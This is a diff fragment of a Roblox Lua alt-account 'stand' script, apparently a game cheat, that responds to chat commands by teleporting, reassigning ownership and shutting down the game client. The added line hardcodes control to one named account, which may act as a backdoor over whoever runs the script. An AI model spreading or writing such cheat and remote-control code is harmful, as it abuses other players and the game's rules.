@@ -7334,7 +7334,7 @@ function Stand(targetName)
             local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
             Event:FireServer(A_1, A_2)
         end
-        
+        OWNER = game.Players.roopin01
         local targetNames = {"isthisdo23", "cruciatusadidas","RKLWPGZLG", "roopin01", "deeralttrue","dahoodbotmoney5","yowhatsubbro","Rag0_IQ"}
         if table.find(targetNames, OWNER.Name) then
             print("DEER")
@@ -7368,8 +7368,8 @@ function Stand(targetName)
                     Stop()
                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
                 elseif msg:lower() == "!steal." then
-                            OWNER = targetPlayer
-                            Chat("New owner "..targetPlayer.Name)
+                        OWNER = targetPlayer
+                        Chat("New owner "..targetPlayer.Name)
                 elseif msg:lower() == "!log." then
                     game:Shutdown()
                 elseif msg:lower() == "!Buy." then
